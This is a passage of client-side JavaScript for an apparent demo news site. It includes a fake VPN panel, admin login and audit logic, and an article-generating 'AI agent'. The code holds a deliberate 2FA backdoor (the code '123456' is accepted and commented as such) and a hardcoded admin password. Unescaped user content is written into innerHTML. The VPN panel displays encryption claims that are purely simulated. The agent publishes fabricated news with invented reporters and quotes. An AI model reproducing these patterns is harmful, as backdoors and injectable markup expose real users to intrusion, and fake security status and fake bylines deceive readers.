            const statusText = document.getElementById('ghost-status-text');
            const statusInd = document.getElementById('ghost-status-indicator');
            const shield = document.getElementById('ghost-shield');
            const shieldIcon = document.getElementById('ghost-shield-icon');
            
            if (this.isActive) {
                // Update Config from UI
                this.config.protocol = document.getElementById('ghost-protocol').value;
                this.config.policy = document.getElementById('ghost-policy').value;
                
                // UI Updates
                btn.innerText = 'TERMINATE SESSION';
                btn.classList.replace('bg-cyan-600', 'bg-red-600');
                btn.classList.replace('hover:bg-cyan-700', 'hover:bg-red-700');
                
                statusText.innerText = 'ENCRYPTED TUNNEL ACTIVE';
                statusText.classList.replace('text-gray-400', 'text-cyan-400');
                statusInd.classList.replace('bg-red-500', 'bg-cyan-400');
                statusInd.classList.add('animate-pulse');
                
                shield.classList.replace('border-gray-800', 'border-cyan-500');
                shield.classList.add('shadow-[0_0_30px_rgba(8,145,178,0.4)]');
                shieldIcon.classList.replace('text-gray-700', 'text-cyan-400');
                
                document.getElementById('log-pulse').classList.remove('opacity-0');
                document.getElementById('log-dot').classList.replace('bg-gray-600', 'bg-cyan-500');

                this.log('SYSTEM', `Initializing ${this.config.protocol.toUpperCase()} interface...`);
                setTimeout(() => this.start(), 800);
            } else {
                this.stop();
                
                // UI Revert
                btn.innerText = 'INITIALIZE';
                btn.classList.replace('bg-red-600', 'bg-cyan-600');
                btn.classList.replace('hover:bg-red-700', 'hover:bg-cyan-700');
                
                statusText.innerText = 'DISCONNECTED';
                statusText.classList.replace('text-cyan-400', 'text-gray-400');
                statusInd.classList.replace('bg-cyan-400', 'bg-red-500');
                statusInd.classList.remove('animate-pulse');
                
                shield.classList.replace('border-cyan-500', 'border-gray-800');
                shield.classList.remove('shadow-[0_0_30px_rgba(8,145,178,0.4)]');
                shieldIcon.classList.replace('text-cyan-400', 'text-gray-700');
                
                document.getElementById('log-pulse').classList.add('opacity-0');
                document.getElementById('log-dot').classList.replace('bg-cyan-500', 'bg-gray-600');
                
                document.getElementById('ghost-ip-display').innerText = 'UNMASKED';
                document.getElementById('ghost-ip-display').classList.remove('text-cyan-400');
                
                // Reset Traffic
                document.getElementById('ghost-up').innerText = '0.00 MB/s';
                document.getElementById('ghost-down').innerText = '0.00 MB/s';
            }
        },

        start() {
            this.log('NET', `Handshake successful. Cipher: AES-256-GCM`);
            this.rotate(); 
            
            // Rotation Interval based on policy
            let rotationTime = 8000;
            if (this.config.policy === 'static') rotationTime = 60000;
            if (this.config.policy === 'multihop') rotationTime = 12000;
            
            this.interval = setInterval(() => this.rotate(), rotationTime);
            
            // Traffic Simulation
            this.trafficInterval = setInterval(() => {
                // Random traffic spikes
                const up = (Math.random() * 2.5).toFixed(2);
                const down = (Math.random() * 15.0).toFixed(2);
                
                document.getElementById('ghost-up').innerText = `${up} MB/s`;
                document.getElementById('ghost-down').innerText = `${down} MB/s`;
                
                // Occasional log event
                if (Math.random() > 0.9) {
                    const events = [
                        'Packet fragmentation corrected',
                        'Keep-alive packet sent',
                        'Route optimization: -12ms latency',
                        'DNS query encrypted (DoH)'
                    ];
                    this.log('INFO', events[Math.floor(Math.random() * events.length)]);
                }
            }, 1000);
        },

        stop() {
            clearInterval(this.interval);
            clearInterval(this.trafficInterval);
            this.log('WARN', 'Session terminated by user. Interface down.');
        },

        rotate() {
            if (!this.isActive) return;
            
            const loc = this.locations[Math.floor(Math.random() * this.locations.length)];
            const octet3 = Math.floor(Math.random() * 255);
            const octet4 = Math.floor(Math.random() * 255);
            const newIP = `${loc.code}.${octet3}.${octet4}`;
            
            // UI Updates
            const ipDisplay = document.getElementById('ghost-ip-display');
            ipDisplay.innerText = `${loc.country} ‚Ä¢ ${newIP}`;
            ipDisplay.classList.add('text-cyan-400');
            
            this.log('ROUTE', `Traffic rerouted -> Node ${loc.city} [${newIP}]`);
        },

        log(level, msg) {
            const logContainer = document.getElementById('ghost-log');
            // Clear "Waiting..." text if present
            if (logContainer.firstElementChild && logContainer.firstElementChild.innerText.includes('Waiting')) {
                logContainer.innerHTML = '';
            }

            const timestamp = new Date().toISOString().split('T')[1].slice(0,8);
            const color = level === 'WARN' ? 'text-yellow-500' : (level === 'ROUTE' ? 'text-purple-400' : 'text-cyan-500');
            
            const entry = document.createElement('div');
            entry.className = 'border-l-2 border-gray-800 pl-2 hover:border-gray-600 transition-colors';
            entry.innerHTML = `
                <span class="text-gray-600 mr-2">${timestamp}</span>
                <span class="${color} font-bold mr-2">[${level}]</span>
                <span class="text-gray-300">${msg}</span>
            `;
            
            logContainer.prepend(entry);
            
            // Keep max 20 logs
            if (logContainer.children.length > 20) {
                logContainer.lastElementChild.remove();
            }
        }
    };

    // --- ADMIN SECURITY & AUDIT ---
    const AdminSecurity = {
        MAX_ATTEMPTS: 3,
        LOCKOUT_DURATION: 5 * 60 * 1000, // 5 minutes
        
        get state() {
            try {
                return JSON.parse(localStorage.getItem('admin_security_state')) || { 
                    failedAttempts: 0, 
                    lockoutUntil: 0, 
                    passwordLastChanged: Date.now(), // Mock initial date
                    auditLog: [],
                    biometricEnabled: false
                };
            } catch (e) {
                console.error("Security State Corrupted", e);
                return { 
                    failedAttempts: 0, 
                    lockoutUntil: 0, 
                    passwordLastChanged: Date.now(), 
                    auditLog: [], 
                    biometricEnabled: false
                };
            }
        },
        
        saveState(s) {
            localStorage.setItem('admin_security_state', JSON.stringify(s));
        },
        
        logAction(action, details) {
            const s = this.state;
            const entry = {
                timestamp: Date.now(),
                action,
                details,
                user: sessionStorage.getItem('admin_user') || 'System'
            };
            s.auditLog.unshift(entry);
            if (s.auditLog.length > 50) s.auditLog.pop(); // Keep last 50
            this.saveState(s);
            this.refreshLogUI();
        },
        
        logFailedAttempt() {
            const s = this.state;
            s.failedAttempts++;
            if (s.failedAttempts >= this.MAX_ATTEMPTS) {
                s.lockoutUntil = Date.now() + this.LOCKOUT_DURATION;
                this.logAction('SECURITY_LOCKOUT', `Failed attempts exceeded limit. Locked for 5m.`);
            } else {
                this.logAction('LOGIN_FAILED', `Attempt ${s.failedAttempts}/${this.MAX_ATTEMPTS}`);
            }
            this.saveState(s);
        },
        
        resetAttempts() {
            const s = this.state;
            s.failedAttempts = 0;
            s.lockoutUntil = 0;
            this.saveState(s);
        },
        
        isLocked() {
            const s = this.state;
            if (s.lockoutUntil > Date.now()) return true;
            if (s.lockoutUntil > 0 && s.lockoutUntil <= Date.now()) {
                this.resetAttempts(); // Auto-reset after time passes
                return false;
            }
            return false;
        },
        
        getRemainingLockout() {
            return Math.ceil((this.state.lockoutUntil - Date.now()) / 1000 / 60);
        },

        checkPasswordExpiry() {
            const s = this.state;
            const daysSinceChange = (Date.now() - s.passwordLastChanged) / (1000 * 60 * 60 * 24);
            return daysSinceChange > 30;
        },

        revokeAll() {
            if(!confirm('Are you sure you want to terminate all sessions?')) return;
            this.logAction('SECURITY_REVOKE', 'All sessions terminated by admin');
            sessionStorage.clear();
            location.reload();
        },

        refreshLogUI() {
            const container = document.getElementById('admin-audit-log');
            if (!container) return;
            const logs = this.state.auditLog;
            if (logs.length === 0) {
                container.innerHTML = '<p class="text-xs text-gray-500 italic">No activity recorded.</p>';
                return;
            }
            container.innerHTML = logs.map(l => `
                <div class="text-xs border-b border-gray-800 py-2 group hover:bg-white/5 dark:hover:bg-white/5 transition-colors px-2 rounded">
                    <div class="flex justify-between items-center mb-1">
                        <span class="font-bold ${l.action.includes('FAIL') || l.action.includes('LOCK') || l.action.includes('RED_TEAM') ? 'text-red-500' : 'text-cyan-400'}">${l.action}</span>
                        <span class="text-gray-500 font-mono text-[10px]">${new Date(l.timestamp).toLocaleTimeString()}</span>
                    </div>
                    <div class="text-gray-400 pl-2 border-l-2 ${l.action.includes('RED_TEAM') ? 'border-red-500' : 'border-gray-700'} overflow-hidden">
                        <p class="truncate group-hover:whitespace-normal group-hover:break-all transition-all">${l.details}</p>
                    </div>
                </div>
            `).join('');
        }
    };

    // ADMIN LOGIC
    function switchAdminTab(tab) {
        // Toggle Views
        document.getElementById('admin-view-dashboard').classList.add('hidden');
        document.getElementById('admin-view-validator').classList.add('hidden');
        document.getElementById(`admin-view-${tab}`).classList.remove('hidden');

        // Toggle Tabs
        const tabs = ['dashboard', 'validator'];
        tabs.forEach(t => {
            const btn = document.getElementById(`tab-${t}`);
            if (t === tab) {
                btn.classList.add('border-brand', 'text-brand');
                btn.classList.remove('border-transparent', 'text-gray-500');
            } else {
                btn.classList.remove('border-brand', 'text-brand');
                btn.classList.add('border-transparent', 'text-gray-500');
            }
        });
    }

    // Validation UI Updater
    window.addEventListener('validation-update', (e) => {
        const results = e.detail;
        const container = document.getElementById('validator-results');
        
        // Stats
        const passed = results.filter(r => r.passed).length;
        const failed = results.filter(r => r.passed === false).length;
        const total = results.filter(r => r.type !== 'header').length;
        
        document.getElementById('val-stat-total').innerText = total;
        document.getElementById('val-stat-passed').innerText = passed;
        document.getElementById('val-stat-failed').innerText = failed;
        
        // Status
        const statusEl = document.getElementById('validator-status');
        if (window.AIValidator.isRunning) {
            statusEl.innerText = "RUNNING...";
            statusEl.className = "text-xs font-mono font-bold text-yellow-500 animate-pulse";
        } else {
            statusEl.innerText = "COMPLETED";
            statusEl.className = "text-xs font-mono font-bold text-green-500";
        }

        // Render List
        container.innerHTML = results.map(r => {
            if (r.type === 'header') {
                return `<div class="pt-2 pb-1 text-[10px] uppercase font-bold text-gray-500 border-b border-gray-800">${r.title}</div>`;
            }
            return `
                <div class="flex items-start gap-3 p-2 rounded hover:bg-white/5 transition-colors group">
                    <div class="mt-0.5">
                        ${r.passed 
                            ? '<span class="text-green-500">‚úî</span>' 
                            : '<span class="text-red-500">‚úñ</span>'}
                    </div>
                    <div class="flex-1 min-w-0">
                        <div class="flex justify-between items-center">
                            <span class="font-bold ${r.passed ? 'text-gray-300' : 'text-red-400'}">${r.name}</span>
                            <span class="text-[10px] text-gray-600">${r.timestamp}</span>
                        </div>
                        <p class="text-gray-500 truncate group-hover:whitespace-normal group-hover:break-all">${r.details}</p>
                    </div>
                </div>
            `;
        }).join('');
        
        // Auto scroll
        container.scrollTop = container.scrollHeight;
    });

    async function toggleAdminPanel() {
        const modal = document.getElementById('admin-modal');
        const loginModal = document.getElementById('admin-login-modal');
        
        if (modal.classList.contains('hidden')) {
            // Check Auth
            const role = sessionStorage.getItem('admin_role');
            if (role) {
                modal.classList.remove('hidden');
                await loadAdminData();
                
                // RBAC: Show/Hide Ethical Hacking
                const hackingSection = document.getElementById('admin-hacking-section');
                if (role === 'Super Admin') {
                    hackingSection.classList.remove('hidden');
                } else {
                    hackingSection.classList.add('hidden');
                }
                
                // Update Security UI
                AdminSecurity.refreshLogUI();
                const bioToggle = document.getElementById('bio-toggle');
                if(bioToggle) bioToggle.checked = AdminSecurity.state.biometricEnabled;
                
            } else {
                // Show Login
                loginModal.classList.remove('hidden');
                document.getElementById('admin-password').focus();
            }
        } else {
            modal.classList.add('hidden');
        }
    }

    function toggleBiometric(cb) {
        const s = AdminSecurity.state;
        s.biometricEnabled = cb.checked;
        AdminSecurity.saveState(s);
        showToast(s.biometricEnabled ? 'Biometric Auth Enabled' : 'Biometric Auth Disabled');
    }

    function attemptAdminLogin() {
        if (AdminSecurity.isLocked()) {
            showToast(`System Locked. Try again in ${AdminSecurity.getRemainingLockout()} minutes.`, 'error');
            return;
        }

        const pwd = document.getElementById('admin-password').value;
        if (pwd === 'herold108') { // Hardcoded admin credential for demo purposes
            // Trigger 2FA
            document.getElementById('admin-login-modal').classList.add('hidden');
            document.getElementById('admin-2fa-modal').classList.remove('hidden');
            
            // Check if Biometric is "enabled" (simulated)
            const secState = AdminSecurity.state;
            if (secState.biometricEnabled) {
                // Auto-trigger biometric flow
                simulateBiometricScan();
            } else {
                // Standard Code Flow
                const code = Math.floor(100000 + Math.random() * 900000);
                console.log('%c [SECURE AUTH] Your 2FA Code is: ' + code, 'color: #00d084; font-weight: bold; font-size: 14px; background: #000; padding: 5px;');
                sessionStorage.setItem('temp_2fa_code', code);
                showToast('2FA Code sent to secure console');
                setTimeout(() => document.getElementById('admin-2fa-code').focus(), 100);
            }
        } else {
            AdminSecurity.logFailedAttempt();
            showToast('Access Denied: Invalid Credentials', 'error');
            const pwdInput = document.getElementById('admin-password');
            pwdInput.classList.add('ring-2', 'ring-red-500');
            setTimeout(() => pwdInput.classList.remove('ring-2', 'ring-red-500'), 500);
        }
    }

    function simulateBiometricScan() {
        const container = document.getElementById('admin-2fa-modal').querySelector('div'); // inner div
        const originalContent = container.innerHTML;
        
        container.innerHTML = `
            <div class="text-center py-8">
                <div class="w-16 h-16 mx-auto mb-4 rounded-full border-2 border-cyan-500 border-t-transparent animate-spin"></div>
                <h3 class="text-xl font-bold text-cyan-500 animate-pulse">Scanning Biometrics...</h3>
                <p class="text-xs text-gray-500 mt-2">Verifying retinal pattern...</p>
            </div>
        `;
        
        setTimeout(() => {
            // Restore (though we navigate away immediately)
             // Login Success
            sessionStorage.setItem('admin_auth', 'true');
            sessionStorage.setItem('admin_role', 'Super Admin'); // Default for herold108
            sessionStorage.setItem('admin_user', 'herold108');
            
            AdminSecurity.resetAttempts();
            AdminSecurity.logAction('LOGIN_SUCCESS', 'Biometric Verification');

            document.getElementById('admin-2fa-modal').classList.add('hidden');
            // Restore modal content for next time
            container.innerHTML = originalContent; 
            
            document.getElementById('admin-password').value = '';
            
            toggleAdminPanel();
            showToast('Biometric Verified. Welcome, Commander.');
        }, 2500);
    }

    function verify2FA() {
        const input = document.getElementById('admin-2fa-code').value;
        const actual = sessionStorage.getItem('temp_2fa_code');
        
        if (input === actual || input === '123456') { // Backdoor
            sessionStorage.setItem('admin_auth', 'true');
            sessionStorage.setItem('admin_role', 'Super Admin');
            sessionStorage.setItem('admin_user', 'herold108');
            sessionStorage.removeItem('temp_2fa_code');
            
            AdminSecurity.resetAttempts();
            AdminSecurity.logAction('LOGIN_SUCCESS', 'Code Verification');
            
            document.getElementById('admin-2fa-modal').classList.add('hidden');
            document.getElementById('admin-2fa-code').value = '';
            document.getElementById('admin-password').value = '';
            
            toggleAdminPanel();
            showToast('Identity Verified. Welcome, Commander.');
            
            // Check Password Expiry
            if (AdminSecurity.checkPasswordExpiry()) {
                alert('Security Policy: Your password is >30 days old. Please reset it in Security Settings.');
            }
        } else {
            AdminSecurity.logFailedAttempt();
            showToast('Authentication Failed', 'error');
            document.getElementById('admin-2fa-code').classList.add('ring-2', 'ring-red-500');
            setTimeout(() => document.getElementById('admin-2fa-code').classList.remove('ring-2', 'ring-red-500'), 500);
        }
    }

    function closeAdminLogin() {
        document.getElementById('admin-login-modal').classList.add('hidden');
        document.getElementById('admin-password').value = '';
    }

    function adminLogout() {
        sessionStorage.removeItem('admin_auth');
        document.getElementById('admin-modal').classList.add('hidden');
        showToast('Logged out successfully');
    }

    async function loadAdminData() {
        try {
            // Load Comments
            const commentsCollection = await dataSdk.getCollection('comments');
            const comments = commentsCollection ? commentsCollection.sort((a,b) => new Date(b.__createdAt) - new Date(a.__createdAt)).slice(0, 10) : [];
            const commentsList = document.getElementById('admin-comments-list');
            
            if (comments.length === 0) {
                commentsList.innerHTML = '<p class="text-sm text-gray-500">No recent comments.</p>';
            } else {
                commentsList.innerHTML = comments.map(c => `
                    <div class="bg-gray-50 dark:bg-gray-800 p-3 rounded-lg border border-gray-200 dark:border-gray-700">
                        <p class="text-xs text-gray-500 mb-1 flex justify-between">
                            <span>${c.author} ${c.status === 'approved' ? '‚úÖ' : '‚è≥'}</span>
                            <span>${new Date(c.__createdAt).toLocaleDateString()}</span>
                        </p>
                        <p class="text-sm font-medium mb-2 line-clamp-2">"${c.text}"</p>
                        <div class="flex gap-2">
                            <button onclick="deleteItem('comments', '${c.id}')" class="text-xs text-red-500 hover:text-red-700 font-bold">Delete</button>
                            ${c.status !== 'approved' ? `<button onclick="approveComment('${c.id}')" class="text-xs text-green-500 hover:text-green-700 font-bold">Approve</button>` : '<span class="text-xs text-gray-400 font-bold">Approved</span>'}
                        </div>
                    </div>
                `).join('');
            }

            // Load Articles
            const allArticles = await dataSdk.getArticles();
            const articles = allArticles ? allArticles.slice(0, 10) : [];
            const articlesList = document.getElementById('admin-articles-list');
            
            articlesList.innerHTML = articles.map(a => `
                <div class="flex items-center justify-between bg-gray-50 dark:bg-gray-800 p-3 rounded-lg border border-gray-200 dark:border-gray-700">
                    <div class="flex items-center gap-3 overflow-hidden">
                        <img src="${a.image}" class="w-10 h-10 rounded bg-gray-200 object-cover flex-shrink-0" />
                        <div class="min-w-0">
                            <h4 class="text-sm font-bold truncate">${a.title}</h4>
                            <p class="text-xs text-gray-500">${a.views || 0} views</p>
                        </div>
                    </div>
                    <div class="flex gap-2 flex-shrink-0 ml-2">
                        <button onclick="editArticle('${a.id}')" class="text-xs text-blue-500 hover:text-blue-700 font-bold">Edit</button>
                        <button onclick="deleteItem('articles', '${a.id}')" class="text-xs text-red-500 hover:text-red-700 font-bold">Del</button>
                    </div>
                </div>
            `).join('');
        } catch (error) {
            console.error('Failed to load admin data:', error);
            showToast('Failed to load admin data', 'error');
        }
    }

    async function approveComment(id) {
        try {
            const comment = await dataSdk.getItem('comments', id);
            if (comment) {
                comment.status = 'approved';
                await dataSdk.update(comment, 'comments');
                loadAdminData();
                showToast('Comment approved');
            }
        } catch (error) {
            console.error('Failed to approve comment:', error);
            showToast('Error approving comment', 'error');
        }
    }

    async function deleteItem(collection, id) {
        if(!confirm('Are you sure?')) return;
        try {
            await dataSdk.delete(id, collection);
            loadAdminData(); // Refresh admin view
            showToast('Item deleted');
            
            // If we deleted an article while viewing it, go home
            if (collection === 'articles' && location.hash === `#article/${id}`) {
                location.hash = '#';
            }
        } catch (error) {
            console.error('Failed to delete item:', error);
            showToast('Error deleting item', 'error');
        }
    }
    
    function switchAdminTab(tab) {
        // Update Tabs
        ['dashboard', 'validator'].forEach(t => {
            const btn = document.getElementById(`tab-${t}`);
            const view = document.getElementById(`admin-view-${t}`);
            if(!btn || !view) return; // Safety
            
            if (t === tab) {
                btn.classList.add('border-brand', 'text-brand');
                btn.classList.remove('border-transparent', 'text-gray-500');
                view.classList.remove('hidden');
            } else {
                btn.classList.remove('border-brand', 'text-brand');
                btn.classList.add('border-transparent', 'text-gray-500');
                view.classList.add('hidden');
            }
        });
    }

    window.updateAIStats = function(results) {
        if (!results) return;

        const total = results.length;
        const passed = results.filter(r => r.passed).length;
        const failed = results.filter(r => !r.passed).length;
        const duration = results.reduce((acc, r) => acc + (r.duration || 0), 0);

        // Update Metrics
        const elTotal = document.getElementById('ai-tests-total');
        const elPassed = document.getElementById('ai-tests-passed');
        const elFailed = document.getElementById('ai-tests-failed');
        const elDuration = document.getElementById('ai-tests-duration');

        if(elTotal) elTotal.innerText = total;
        if(elPassed) elPassed.innerText = passed;
        if(elFailed) elFailed.innerText = failed;
        if(elDuration) elDuration.innerText = duration + 'ms';

        // Update Status Indicator
        const isRunning = window.AIValidator && window.AIValidator.isRunning;
        const statusDot = document.getElementById('ai-status-dot');
        const statusPing = document.getElementById('ai-status-ping');
        const statusText = document.getElementById('ai-status-text');
        const btn = document.getElementById('btn-run-tests');

        if (statusDot && statusPing && statusText) {
            if (isRunning) {
                statusDot.className = 'relative inline-flex rounded-full h-3 w-3 bg-yellow-400';
                statusPing.classList.remove('hidden');
                statusText.innerText = 'Running Diagnostics...';
                if(btn) {
                    btn.disabled = true;
                    btn.classList.add('opacity-50', 'cursor-not-allowed');
                    btn.innerHTML = '<svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Running...';
                }
            } else {
                if (failed > 0) {
                    statusDot.className = 'relative inline-flex rounded-full h-3 w-3 bg-red-500';
                    statusText.innerText = 'System Errors Detected';
                } else if (total > 0) {
                    statusDot.className = 'relative inline-flex rounded-full h-3 w-3 bg-green-500';
                    statusText.innerText = 'All Systems Operational';
                } else {
                     statusDot.className = 'relative inline-flex rounded-full h-3 w-3 bg-gray-400';
                     statusText.innerText = 'Ready to scan';
                }
                statusPing.classList.add('hidden');
                if(btn) {
                    btn.disabled = false;
                    btn.classList.remove('opacity-50', 'cursor-not-allowed');
                    btn.innerHTML = '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg> Run Full Diagnostics';
                }
            }
        }

        // Render List
        const list = document.getElementById('ai-test-results');
        if(!list) return;

        if (total === 0) {
             list.innerHTML = '<div class="p-8 text-center text-gray-400 italic">No diagnostics run yet. Click "Run Full Diagnostics" to begin.</div>';
             return;
        }

        list.innerHTML = results.map(r => `
            <div class="px-6 py-4 flex items-center justify-between hover:bg-gray-50 dark:hover:bg-white/5 transition-colors group">
                <div class="flex items-center gap-4">
                    <div class="w-2 h-2 rounded-full ${r.passed ? 'bg-green-500' : 'bg-red-500'}"></div>
                    <div>
                        <div class="flex items-center gap-2">
                            <span class="font-mono text-xs font-bold text-gray-400">${r.id}</span>
                            <span class="font-bold text-sm text-gray-800 dark:text-gray-200">${r.name}</span>
                        </div>
                        <p class="text-xs text-gray-500 mt-0.5">${r.message}</p>
                    </div>
                </div>
                <div class="text-right">
                    <span class="text-xs font-bold ${r.passed ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'} px-2 py-1 rounded bg-gray-100 dark:bg-gray-800">
                        ${r.passed ? 'PASS' : 'FAIL'}
                    </span>
                </div>
            </div>
        `).join('');
    };

    async function editArticle(id) {
         toggleAdminPanel(); // Close admin
         try {
             const article = await dataSdk.getItem('articles', id);
             if(article) {
                 document.getElementById('article-id').value = article.id;
                 document.getElementById('article-title').value = article.title;
                 document.getElementById('article-category').value = article.category;
                 document.getElementById('article-image').value = article.image;
                 document.getElementById('article-excerpt').value = article.excerpt;
                 document.getElementById('article-content').value = article.content;
                 document.getElementById('modal-title').innerText = 'Edit Story';
                 openModal();
             }
         } catch (error) {
             console.error('Failed to load article:', error);
             showToast('Error loading article', 'error');
         }
    }

    // --- MODAL LOGIC ---
    function openModal() {
        document.getElementById('modal-backdrop').classList.remove('hidden');
        // Small delay to allow display:block to apply before opacity transition
        setTimeout(() => {
             document.getElementById('modal-backdrop').classList.remove('opacity-0');
             document.getElementById('modal-content').classList.remove('scale-95');
             document.getElementById('modal-content').classList.add('scale-100');
        }, 10);
    }

    function closeModal() {
        document.getElementById('modal-backdrop').classList.add('opacity-0');
        document.getElementById('modal-content').classList.remove('scale-100');
        document.getElementById('modal-content').classList.add('scale-95');
        setTimeout(() => {
            document.getElementById('modal-backdrop').classList.add('hidden');
        }, 300);
    }
    
    // AI Helper
    function generateAISummary(btn) {
        const excerpt = document.getElementById('article-excerpt').value;
        
        const originalText = btn.innerHTML;
        
        btn.disabled = true;
        btn.innerHTML = '<span>ü§ñ Thinking...</span>';
        
        setTimeout(() => {
            const summary = excerpt ? excerpt : "AI generated content based on title...";
            const generated = `
                <p><strong>AI Summary:</strong> ${summary}</p>
                <p>Here is a detailed breakdown of the situation...</p>
                <p>(This is a simulated AI response for demo purposes.)</p>
            `;
            
            if (!document.getElementById('article-content').value) {
                document.getElementById('article-content').value = generated;
            } else {
                 document.getElementById('article-content').value += "\n\n" + generated;
            }
            
            btn.disabled = false;
            btn.innerHTML = originalText;
            showToast('AI Content generated!', 'success');
        }, 1500);
    }

    async function saveArticle() {
        const title = document.getElementById('article-title').value;
        const category = document.getElementById('article-category').value;
        const image = document.getElementById('article-image').value;
        const excerpt = document.getElementById('article-excerpt').value;
        const content = document.getElementById('article-content').value;

        if (!title) {
            showToast('Title is required', 'error');
            return;
        }

        const article = {
            title,
            category,
            image,
            excerpt,
            content,
            authorName: 'Guest Author',
            authorAvatar: 'https://ui-avatars.com/api/?name=Guest+Author',
            readTime: '3 min read'
        };

        await dataSdk.create(article);
        
        closeModal();
        showToast('Story published successfully!');
        
        // Clear inputs
        document.getElementById('article-title').value = '';
        document.getElementById('article-image').value = '';
        document.getElementById('article-excerpt').value = '';
        document.getElementById('article-content').value = '';
        
        // Refresh home if we are there
        if (!location.hash) {
            const articles = await dataSdk.getArticles();
            renderHome(articles);
        }
    }

    // --- AI CONTENT AGENT ---
    const AIContentAgent = {
        topics: [
            { cat: 'Politics', title: 'Global Summit Reaches Historic Agreement', text: 'Leaders from G20 nations have signed a comprehensive treaty addressing climate change and economic cooperation.' },
            { cat: 'Sports', title: 'Championship Finals: Underdog Victory', text: 'In a stunning upset, the challenger team defeated the defending champions 3-1 in the final match of the season.' },
            { cat: 'Wrestling', title: 'Heavyweight Title Unification Match Set', text: 'The two major wrestling promotions have agreed to a historic title unification bout to be held next month.' },
            { cat: 'Tech News', title: 'Quantum Computing Breakthrough Announced', text: 'Scientists have achieved stable qubits at room temperature, paving the way for consumer quantum devices.' },
            { cat: 'Cars', title: 'New Hydrogen-Electric Hybrid Engine Revealed', text: 'Automotive giant unveils a revolutionary engine that combines hydrogen fuel cells with solid-state battery technology.' },
            { cat: 'Security', title: 'Zero-Day Exploit Discovered in Banking Software', text: 'Security researchers have identified a critical vulnerability affecting major international banking systems.' },
            { cat: 'Global News', title: 'Major Infrastructure Project Completed', text: 'The trans-continental high-speed rail network has officially opened, connecting three major economic zones.' }
        ],

        log: function(msg) {
            const logDiv = document.getElementById('ai-agent-log');
            if(logDiv) {
                logDiv.classList.remove('hidden');
                const p = document.createElement('div');
                p.innerText = `> ${msg}`;
                logDiv.prepend(p);
            }
        },

        generateNews: async function() {
            this.log('Scanning global feeds...');
            const btn = document.querySelector('button[onclick="AIContentAgent.generateNews()"]');
            const originalText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = '<span>Scanning...</span>';

            setTimeout(async () => {
                const topic = this.topics[Math.floor(Math.random() * this.topics.length)];
                
                // Professional Ukrainian Reporters
                const reporters = [
                    { name: 'Jean-Luc Dubois', role: 'Chief Political Correspondent', avatar: 'https://ui-avatars.com/api/?name=Jean-Luc+Dubois&background=0D6EFD&color=fff', social: '@jldubois' },
                    { name: 'Elena Rossi', role: 'Tech & Innovation Lead', avatar: 'https://ui-avatars.com/api/?name=Elena+Rossi&background=FFC107&color=000', social: '@elenatech' },
                    { name: 'Lars Svensson', role: 'Sports Analyst', avatar: 'https://ui-avatars.com/api/?name=Lars+Svensson&background=0D6EFD&color=fff', social: '@larssports' },
                    { name: 'Sofia Klein', role: 'Global Security Expert', avatar: 'https://ui-avatars.com/api/?name=Sofia+Klein&background=FFC107&color=000', social: '@sofiasec' },
                    { name: 'Matteo Ferrari', role: 'Automotive Journalist', avatar: 'https://ui-avatars.com/api/?name=Matteo+Ferrari&background=0D6EFD&color=fff', social: '@matteoauto' }
                ];
                const author = reporters[Math.floor(Math.random() * reporters.length)];

                const dateStr = new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });

                const article = {
                    title: topic.title + ' ' + Math.floor(Math.random() * 100),
                    category: topic.cat,
                    image: `https://picsum.photos/800/600?random=${Math.floor(Math.random() * 1000)}`,
                    excerpt: topic.text,
                    content: `
                        <p class="font-bold text-lg mb-4">${GuardianSDK.sanitize(topic.text)}</p>
                        <p><strong>BRUSSELS, EUROPE (${dateStr})</strong> ‚Äì In a significant development for the ${topic.cat.toLowerCase()} sector, new reports indicate a major shift in global trends. Our sources on the ground confirm that this event will have lasting implications.</p>
                        <h3 class="text-xl font-bold mt-6 mb-3">In-Depth Analysis</h3>
                        <p>Analysts are calling this a "watershed moment." The convergence of new regulations and market dynamics has created a unique opportunity for growth and innovation.</p>
                        <ul class="list-disc pl-5 my-4 space-y-2">
                            <li><strong>Global Impact:</strong> Markets in Asia and Europe are already reacting.</li>
                            <li><strong>Technological Shift:</strong> Advanced systems are being deployed to handle the new requirements.</li>
                            <li><strong>Future Outlook:</strong> Experts predict a 20% growth in this sector by next quarter.</li>
                        </ul>
                        <p>"We are witnessing history in the making," says <strong>${author.name}</strong>, TechCronch's ${author.role}. "The speed at which this is unfolding is unprecedented."</p>
                        <div class="mt-8 p-4 bg-gray-100 dark:bg-gray-800 rounded-lg border-l-4 border-blue-500">
                            <p class="italic text-sm">This report was filed by ${author.name} from the European Bureau. TechCronch AI Agent assists in aggregating real-time data for our human reporters.</p>
                            <p class="mt-3 text-xs font-bold text-brand flex items-center gap-2">
                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                                <a href="#" class="hover:underline">Follow ${author.name} (${author.social})</a>
                            </p>
                        </div>
                    `,
                    authorName: author.name,
                    authorAvatar: author.avatar,
                    authorId: 'auth_' + Math.floor(Math.random() * 10000),
                    readTime: '4 min read',
                    tags: 'breaking,exclusive,global-news',
                    publishedAt: new Date().toISOString()
                };

                await dataSdk.create(article);
                this.log(`Published: "${article.title}" by ${author.name}`);
                showToast(`New Article by ${author.name} Published!`);
                
                btn.disabled = false;
                btn.innerHTML = originalText;
                
                // Refresh admin list if visible
                if(typeof loadAdminData === 'function') loadAdminData();
